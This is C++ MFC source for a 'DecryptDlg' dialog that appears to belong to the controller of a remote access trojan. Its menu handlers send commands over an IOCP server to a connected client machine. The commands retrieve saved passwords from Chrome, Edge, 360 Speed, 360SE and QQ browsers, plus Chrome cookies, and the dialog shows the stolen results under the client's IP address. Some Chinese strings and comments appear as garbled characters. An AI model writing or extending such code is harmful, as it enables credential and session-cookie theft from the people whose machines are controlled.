#include "stdafx.h"
#include "DecryptDlg.h"


IMPLEMENT_DYNAMIC(DecryptDlg, CDialog)

DecryptDlg::DecryptDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialogBase(DecryptDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_DECRYPT) {
}

DecryptDlg::~DecryptDlg() {
}

void DecryptDlg::DoDataExchange(CDataExchange* pDX) {
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_DECRYPT_RESULT, m_EditDecrypedResult);
}


BEGIN_MESSAGE_MAP(DecryptDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_COMMAND(ID_DECRYPT_CHROME, &DecryptDlg::OnDecryptChrome)
	ON_COMMAND(ID_DECRYPT_EDGE, &DecryptDlg::OnDecryptEdge)
	ON_COMMAND(ID_DECRYPT_SPEED360, &DecryptDlg::OnDecryptSpeed360)
	ON_COMMAND(ID_DECRYPT_360, &DecryptDlg::OnDecrypt360)
	ON_COMMAND(ID_DECRYPT_QQ, &DecryptDlg::OnDecryptQQ)
	ON_COMMAND(ID_DECRYPT_CHROMECOOKIES, &DecryptDlg::OnDecryptChromeCookies)
END_MESSAGE_MAP()


// DecryptDlg ��Ϣ�������


BOOL DecryptDlg::OnInitDialog() {
	CDialog::OnInitDialog();
	SetIcon(m_hIcon, FALSE);

	CString str;
	str.Format("%s - ��������", m_IPAddress);
	SetWindowText(str);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
	m_EditDecrypedResult.SetWindowTextA(CString("<<< ��ʾ: ���ڲ˵�ѡ��������� >>>\r\n"));
	int m_nCurSel = m_EditDecrypedResult.GetWindowTextLengthA();
	m_EditDecrypedResult.SetSel((int)m_nCurSel, (int)m_nCurSel);
	m_EditDecrypedResult.PostMessage(EM_SETSEL, m_nCurSel, m_nCurSel);

	return TRUE;
}


VOID DecryptDlg::OnReceiveComplete() {
	if (m_ContextObject == NULL) {
		return;
	}
	auto result = m_ContextObject->GetBuffer(1);
	m_EditDecrypedResult.SetWindowTextA(CString(result));
}

void DecryptDlg::OnClose() {
	CancelIO();
	// �ȴ����ݴ������
	if (IsProcessing()) {
		ShowWindow(SW_HIDE);
		return;
	}
	CDialogBase::OnClose();
}

void DecryptDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogBase::OnSize(nType, cx, cy);
	if (m_EditDecrypedResult.GetSafeHwnd())
	{
		m_EditDecrypedResult.MoveWindow(0, 0, cx, cy); // ռ�������Ի���
	}
}


void DecryptDlg::OnDecryptChrome()
{
	BYTE	bToken[32] = { COMMAND_LLQ_GetChromePassWord };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}


void DecryptDlg::OnDecryptEdge()
{
	BYTE	bToken[32] = { COMMAND_LLQ_GetEdgePassWord };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}


void DecryptDlg::OnDecryptSpeed360()
{
	BYTE	bToken[32] = { COMMAND_LLQ_GetSpeed360PassWord };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}


void DecryptDlg::OnDecrypt360()
{
	BYTE	bToken[32] = { COMMAND_LLQ_Get360sePassWord };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}


void DecryptDlg::OnDecryptQQ()
{
	BYTE	bToken[32] = { COMMAND_LLQ_GetQQBroPassWord };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}


void DecryptDlg::OnDecryptChromeCookies()
{
	BYTE	bToken[32] = { COMMAND_LLQ_GetChromeCookies };
	m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
}
